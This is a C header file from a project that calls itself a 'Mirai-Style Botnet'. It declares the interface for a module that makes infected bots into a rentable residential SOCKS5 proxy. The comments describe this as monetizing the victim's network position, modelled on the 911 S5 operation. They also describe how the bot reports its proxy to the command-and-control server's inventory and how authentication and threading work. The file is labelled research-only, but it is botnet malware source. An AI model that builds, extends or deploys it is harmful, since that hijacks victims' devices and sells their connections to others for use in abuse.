/*
 * notnet - Modern Mirai-Style Botnet
 * proxy.h - Residential SOCKS5 forward proxy (#89)
 *
 * Research purposes only.
 */
#ifndef NOTNET_PROXY_H
#define NOTNET_PROXY_H

#include "protocol.h"

/* Residential SOCKS5 forward proxy (#89).
 *
 * Monetizes the bot's network position by renting it out as a residential
 * proxy (the 911 S5 / ZeroAccess-successor pattern). The bot listens on a
 * port and forwards CONNECT requests to arbitrary IPv4/domain destinations
 * after RFC 1928 handshake + RFC 1929 username/password authentication (the
 * configured proxy_token is the password; the username is not checked).
 *
 * Threading model: proxy_start() binds a listener and spawns the accept
 * loop in its own pthread so the proxy never blocks the C2 main loop. Each
 * accepted connection is handled in its own detached thread (capped at
 * PROXY_MAX_CONNS). proxy_stop() sets a stop flag, closes the listener,
 * joins the accept thread, and clears state — safe to call at shutdown.
 *
 * Security posture:
 *  - Auth is mandatory and FAIL-CLOSED: proxy_start() refuses to bind when
 *    no proxy_token is configured. A client that offers no user/pass method
 *    is rejected with method 0xFF.
 *  - The password comparison is constant-time (timing side-channel, #11).
 *  - IPv4 (ATYP 0x01) and domain (ATYP 0x03) destinations are supported;
 *    IPv6 (ATYP 0x04) and unknown address types are rejected with 0x08.
 *  - Every buffer is bounded (PROXY_BUF_SIZE), handshake/tunnel I/O is
 *    time-bounded via select(), and each send/recv return is checked.
 *  - The token is held in memory only; it is never logged or written out.
 *
 * Returns 0 on success, -1 on failure (e.g. token unset, bind failed,
 * thread spawn failed). proxy_start() on an already-running proxy is a
 * no-op returning 0. */
int proxy_start(notnet_bot_t *bot);
void proxy_stop(void);

/* Report current state (1 = accept loop running / 0 = stopped) and the
 * actual bound port (0 when not running). Used by the heartbeat to build
 * the C2's residential-proxy inventory. */
int proxy_is_running(void);
int proxy_get_port(void);

#endif /* NOTNET_PROXY_H */
